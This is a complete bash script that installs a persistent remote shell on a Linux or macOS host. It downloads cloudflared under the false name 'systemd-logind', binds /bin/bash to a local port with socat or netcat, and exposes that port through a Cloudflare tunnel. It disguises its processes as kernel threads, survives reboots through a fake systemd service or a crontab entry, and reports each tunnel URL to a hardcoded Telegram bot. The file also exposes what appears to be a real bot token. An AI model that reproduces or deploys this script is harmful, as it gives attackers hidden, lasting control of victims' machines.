#!/usr/bin/env bash
# Cloudflare Tunnel Reverse Shell (persistent) + Telegram notifikasi
# Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"

set -euo pipefail

# ========== KONFIGURASI ==========
: "${HOME:=/tmp}"
: "${USER:=$(whoami 2>/dev/null || echo unknown)}"
: "${UID:=$(id -u 2>/dev/null || echo 0)}"

# Nama binary dan direktori (usahakan sembunyi)
BIN_HIDDEN_NAME="systemd-logind"
CONFIG_DIR=".config/dbus"
URL_BASE="https://github.com/cloudflare/cloudflared/releases/latest/download"
PORT=$((RANDOM % 40000 + 10000))

# Daftar nama proses kernel untuk menyembunyikan proses
KERNEL_PROC_NAMES=(
    "[kworker/u:0]" "[kworker/0:0]" "[rcu_gp]" "[rcu_par_gp]" "[ksoftirqd/0]"
    "[kthreadd]" "[slub_flushwq]" "[kcompactd0]" "[kswapd0]" "[jbd2/sda1-8]" "[ext4-rsv-conver]"
)
PROC_HIDDEN_NAME="${KERNEL_PROC_NAMES[$((RANDOM % ${#KERNEL_PROC_NAMES[@]}))]}"

# Telegram (isi sesuai)
TELEGRAM_BOT_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
TELEGRAM_CHAT_ID="6223261018"

# ========== FUNGSI ==========
print_step() { printf "%-50s" "$1"; }
finish_ok()     { echo "[OK]"; }
finish_skip()   { echo "[SKIPPING]"; }
finish_failed() { echo "[FAILED]"; exit 1; }
error() { echo -e "\033[1;31m$*\033[0m" >&2; }
info()  { echo -e "\033[1;32m$*\033[0m" >&2; }
warn()  { echo -e "\033[1;33m$*\033[0m" >&2; }

# Kirim Telegram dengan fallback curl/wget
send_telegram() {
    local message="$1"
    if [[ -n "$TELEGRAM_BOT_TOKEN" && "$TELEGRAM_BOT_TOKEN" != "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" && -n "$TELEGRAM_CHAT_ID" ]]; then
        local url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
        local data="chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=HTML"
        if command -v curl >/dev/null; then
            curl -s -X POST "$url" -d "$data" >/dev/null 2>&1 &
        elif command -v wget >/dev/null; then
            wget -q --post-data "$data" "$url" >/dev/null 2>&1 &
        fi
    fi
}

# Deteksi arsitektur
detect_arch() {
    local arch=$(uname -m)
    local os=$(uname -s | tr '[:upper:]' '[:lower:]')
    case "$os" in
        linux)  os="linux" ;;
        darwin) os="darwin" ;;
        *)      error "Unsupported OS: $os"; exit 1 ;;
    esac
    case "$arch" in
        x86_64|amd64) arch="amd64" ;;
        aarch64|arm64) arch="arm64" ;;
        armv7l)        arch="arm" ;;
        i386|i686)     arch="386" ;;
        *) error "Unsupported arch: $arch"; exit 1 ;;
    esac
    echo "${os}-${arch}"
}

# Download cloudflared
download_cloudflared() {
    local arch="$1"
    local url="${URL_BASE}/cloudflared-${arch}"
    local out="$TMPDIR/cloudflared"
    if command -v curl >/dev/null; then
        curl -fsSL -o "$out" "$url" 2>/dev/null || return 1
    elif command -v wget >/dev/null; then
        wget -q -O "$out" "$url" 2>/dev/null || return 1
    else
        return 1
    fi
    chmod 755 "$out"
    echo "$out"
}

# Mulai bindshell (local)
start_bindshell() {
    local port="$1"
    local bind_cmd
    if command -v socat >/dev/null; then
        bind_cmd="socat TCP-LISTEN:${port},bind=127.0.0.1,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    elif command -v ncat >/dev/null; then
        bind_cmd="ncat -lvvk ${port} -e /bin/bash --allow 127.0.0.1"
    elif command -v nc >/dev/null && nc -h 2>&1 | grep -q -e '-e'; then
        bind_cmd="nc -l -p ${port} -s 127.0.0.1 -e /bin/bash"
    else
        bind_cmd="bash -c 'while true; do nc -l -p ${port} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done'"
    fi
    ( exec -a "$PROC_HIDDEN_NAME" nohup $bind_cmd >/dev/null 2>&1 ) &
    echo $!
}

# Mulai tunnel langsung (untuk sesi pertama)
start_tunnel_direct() {
    local port="$1"
    local bin="$2"
    ( exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://127.0.0.1:${port}" >> "$TMPDIR/cloudflared.log" 2>&1 ) &
    echo $!
}

# Buat skrip persistence (bind shell + tunnel) yang akan dijalankan otomatis
create_persistence_script() {
    local bin_path="$1"
    local port="$2"
    local script_path="$3"
    local telegram_token="$4"
    local telegram_chat="$5"
    local proc_name="$6"
    cat > "$script_path" <<EOF
#!/bin/bash
# Persistence script (bind shell + tunnel)
BIN="$bin_path"
PORT=$port
TMPDIR="$TMPDIR"
TELEGRAM_TOKEN="$telegram_token"
TELEGRAM_CHAT="$telegram_chat"
PROC_NAME="$proc_name"
URL_SENT_FILE="\$TMPDIR/url_sent"

send_telegram() {
    if [[ -n "\$TELEGRAM_TOKEN" && "\$TELEGRAM_TOKEN" != "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" && -n "\$TELEGRAM_CHAT" ]]; then
        local url="https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage"
        local data="chat_id=\${TELEGRAM_CHAT}&text=\$1&parse_mode=HTML"
        if command -v curl >/dev/null; then
            curl -s -X POST "\$url" -d "\$data" >/dev/null 2>&1 &
        elif command -v wget >/dev/null; then
            wget -q --post-data "\$data" "\$url" >/dev/null 2>&1 &
        fi
    fi
}

# Jalankan bindshell dengan restart loop
run_bindshell() {
    while true; do
        if command -v socat >/dev/null; then
            exec -a "\$PROC_NAME" socat TCP-LISTEN:\${PORT},bind=127.0.0.1,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
        elif command -v ncat >/dev/null; then
            exec -a "\$PROC_NAME" ncat -lvvk \${PORT} -e /bin/bash --allow 127.0.0.1
        elif command -v nc >/dev/null && nc -h 2>&1 | grep -q -e '-e'; then
            exec -a "\$PROC_NAME" nc -l -p \${PORT} -s 127.0.0.1 -e /bin/bash
        else
            exec -a "\$PROC_NAME" bash -c "while true; do nc -l -p \${PORT} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done"
        fi
        sleep 5
    done
}

run_bindshell &

# Tunnel loop dengan monitoring URL
while true; do
    exec -a "\$PROC_NAME" "\$BIN" tunnel --url "tcp://127.0.0.1:\$PORT" 2>&1 | while IFS= read -r line; do
        echo "\$line" >> "\$TMPDIR/cloudflared.log"
        if [[ "\$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
            url="\${BASH_REMATCH[0]}"
            if [[ ! -f "\$URL_SENT_FILE" ]] || ! grep -q "\$url" "\$URL_SENT_FILE"; then
                echo "\$url" >> "\$URL_SENT_FILE"
                msg="<b>New Tunnel URL</b>\n\$url\n\nUse: cloudflared access tcp --hostname \$url --url localhost:4444 && nc localhost 4444"
                send_telegram "\$msg"
            fi
        fi
    done
    sleep 10
done
EOF
    chmod 755 "$script_path"
    echo "$script_path"
}

# Install persistence (systemd user atau crontab)
install_persistence() {
    local script_path="$1"
    local service_name="systemd-logind"
    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null; then
        mkdir -p "${HOME}/.config/systemd/user"
        cat > "${HOME}/.config/systemd/user/${service_name}.service" <<EOF
[Unit]
Description=System Logging Daemon
After=network.target

[Service]
ExecStart=$script_path
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload
        systemctl --user enable "$service_name"
        systemctl --user start "$service_name"
        return 0
    elif command -v crontab >/dev/null; then
        (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
        return 0
    else
        return 1
    fi
}

# Uninstall
uninstall() {
    print_step "Removing installed files..."
    pkill -f "$PROC_HIDDEN_NAME" 2>/dev/null || true
    pkill -f "systemd-logind-helper" 2>/dev/null || true
    crontab -l 2>/dev/null | grep -v "systemd-logind-helper" | crontab - 2>/dev/null || true
    if command -v systemctl >/dev/null; then
        systemctl --user stop systemd-logind.service 2>/dev/null || true
        systemctl --user disable systemd-logind.service 2>/dev/null || true
        rm -f "${HOME}/.config/systemd/user/systemd-logind.service"
        systemctl --user daemon-reload 2>/dev/null || true
    fi
    rm -rf "${INSTALL_DIR:-$HOME/.config/dbus}"
    rm -rf "$TMPDIR"
    finish_ok
    echo "--> Uninstall complete."
    exit 0
}

# ========== MAIN ==========
[[ -n "${GS_UNDO:-}" ]] && uninstall

# Tentukan TMPDIR (bersihkan jika ada)
TMPDIR="/tmp/.cf-${UID}"
rm -rf "$TMPDIR" 2>/dev/null || true
mkdir -p "$TMPDIR"

# Tentukan direktori instalasi (prioritas: HOME/.config/dbus, fallback ke /tmp jika gagal)
INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
if ! mkdir -p "$INSTALL_DIR" 2>/dev/null; then
    warn "Cannot create $INSTALL_DIR, using /tmp/.cf-${UID}/install"
    INSTALL_DIR="/tmp/.cf-${UID}/install"
    mkdir -p "$INSTALL_DIR"
fi

# Download binary
print_step "Downloading binaries..."
arch=$(detect_arch)
cf_bin=$(download_cloudflared "$arch") || finish_failed
finish_ok

print_step "Copying binaries..."
cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME" 2>/dev/null || finish_failed
chmod 755 "$INSTALL_DIR/$BIN_HIDDEN_NAME"
cf_bin="$INSTALL_DIR/$BIN_HIDDEN_NAME"
finish_ok

print_step "Testing binaries..."
if ! "$cf_bin" --version &>/dev/null; then finish_failed; fi
finish_ok

print_step "Testing network connectivity..."
if curl -fsSL -m 5 https://cloudflare.com &>/dev/null || wget -q -T 5 --spider https://cloudflare.com &>/dev/null; then
    finish_ok
else
    warn "No internet? Continuing..."
    finish_skip
fi

# Sisa langkah (skip ~/.bashrc, ~/.profile, webhooks)
print_step "Installing access via ~/.bashrc..."; finish_skip
print_step "Installing access via ~/.profile..."; finish_skip
print_step "Executing webhooks..."; finish_skip

echo "--> To uninstall use GS_UNDO=1 bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)\""
echo "--> To connect use: cloudflared access tcp --hostname <URL> --url localhost:4444 && nc localhost 4444"

# Jalankan sementara
print_step "Starting temporary tunnel..."
bind_pid=$(start_bindshell "$PORT")
tunnel_pid=$(start_tunnel_direct "$PORT" "$cf_bin")
cat > "$INSTALL_DIR/tunnel.conf" <<EOF
BIND_PID=$bind_pid
TUNNEL_PID=$tunnel_pid
PROC_NAME=$PROC_HIDDEN_NAME
PORT=$PORT
EOF

sleep 5
if [[ -f "$TMPDIR/cloudflared.log" ]]; then
    url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$TMPDIR/cloudflared.log" | head -1)
    if [[ -n "$url" ]]; then
        echo -e "\n\033[1;32m✅ TUNNEL URL: $url\033[0m"
        send_telegram "<b>Initial Tunnel URL</b>\n$url"
    else
        warn "URL not detected yet. Check $TMPDIR/cloudflared.log"
    fi
fi
finish_ok

# Install persistence
if [[ -z "${GS_NOINST:-}" ]]; then
    # Buat skrip persistence di tempat yang aman (gunakan INSTALL_DIR atau HOME/.config/dbus)
    PERSIST_SCRIPT="${INSTALL_DIR}/systemd-logind-helper"
    create_persistence_script "$cf_bin" "$PORT" "$PERSIST_SCRIPT" "$TELEGRAM_BOT_TOKEN" "$TELEGRAM_CHAT_ID" "$PROC_HIDDEN_NAME"
    if install_persistence "$PERSIST_SCRIPT"; then
        info "Persistence installed (bind shell + tunnel will auto-start after reboot)."
    else
        warn "Persistence not installed (no systemd/cron). Tunnel will not survive reboot."
    fi
fi

echo "--> Join us on Telegram - https://t.me/thcorg"
info "Done. Use GS_UNDO=1 to uninstall."
